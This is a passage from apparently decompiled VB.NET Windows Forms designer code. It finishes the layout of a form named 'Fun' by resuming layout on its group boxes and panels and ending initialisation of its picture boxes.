			size = New Global.System.Drawing.Size(746, 375)
			Me.MinimumSize = size
			Me.Name = "fun"
			Me.StartPosition = Global.System.Windows.Forms.FormStartPosition.CenterScreen
			Me.Text = "Fun  "
			Me.GroupBox7.ResumeLayout(False)
			Me.GroupBox2.ResumeLayout(False)
			Me.GroupBox8.ResumeLayout(False)
			Me.GroupBox6.ResumeLayout(False)
			Me.GroupBox1.ResumeLayout(False)
			Me.GroupBox10.ResumeLayout(False)
			Me.GroupBox9.ResumeLayout(False)
			Me.GroupBox11.ResumeLayout(False)
			Me.GroupBox25.ResumeLayout(False)
			Me.GroupBox19.ResumeLayout(False)
			Me.GroupBox19.PerformLayout()
			Me.GroupBox18.ResumeLayout(False)
			Me.GroupBox20.ResumeLayout(False)
			Me.GroupBox20.PerformLayout()
			Me.GroupBox22.ResumeLayout(False)
			Me.GroupBox22.PerformLayout()
			CType(Me.PictureBox4, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.PictureBox3, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.PictureBox2, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.PictureBox1, Global.System.ComponentModel.ISupportInitialize).EndInit()
			Me.GroupBox21.ResumeLayout(False)
			Me.GroupBox21.PerformLayout()
			Me.Panel1.ResumeLayout(False)
			Me.Panel2.ResumeLayout(False)
			Me.GroupBox16.ResumeLayout(False)
			Me.GroupBox16.PerformLayout()
			Me.GroupBox3.ResumeLayout(False)
			Me.Panel4.ResumeLayout(False)
			Me.Panel6.ResumeLayout(False)
			Me.Panel7.ResumeLayout(False)
			Me.Panel7.PerformLayout()
			Me.ResumeLayout(False)
		End Sub

		' Token: 0x040000ED RID: 237
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
